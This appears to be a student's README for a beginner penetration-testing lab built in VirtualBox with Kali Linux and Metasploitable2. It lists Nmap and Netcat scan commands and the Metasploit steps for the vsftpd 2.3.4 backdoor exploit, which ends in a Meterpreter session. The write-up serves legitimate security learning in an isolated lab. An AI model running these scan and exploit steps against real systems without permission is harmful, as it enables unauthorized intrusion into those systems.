# Cybersecurity Lab Setup – Task 1

## Objective

To set up a basic cybersecurity lab using Kali Linux and Metasploitable, and perform scanning and exploitation.

## Tools Used

* VirtualBox
* Kali Linux
* Metasploitable2
* Nmap
* Netcat
* Metasploit

## Lab Setup

* Installed VirtualBox
* Added Kali Linux (Attacker Machine)
* Added Metasploitable (Target Machine)
* Configured Host-only Network for communication

## Steps Performed

### 1. Network Verification

* Checked IP address using "ifconfig"
* Verified connectivity using "ping"

### 2. Scanning

* Used Nmap to scan target system

```
nmap -sS <target-ip>
```

* Identified open ports such as FTP, SSH, HTTP
### 3. Service Testing

* Used Netcat to check open ports

```
nc -zv <target-ip> 80
```

---

### 4. Exploitation

* Used Metasploit Framework
* Exploited VSFTPD vulnerability

Steps:

1)msfconsole
2)search vsftpd
3)use exploit/unix/ftp/vsftpd_234_backdoor
4)set RHOSTS <target-ip>
5)set LHOST <your-ip>
6)exploit


* Gained Meterpreter session
* Verified access using:

```
whoami
```

## Output

* Successful network connection
* Open ports identified
* Exploit executed
* Access to target system achieved

---

## Conclusion

This lab helped in understanding the basics of penetration testing, including scanning, enumeration, and exploitation in a controlled environment.

---

## Screenshots

All screenshots are included in this repository.
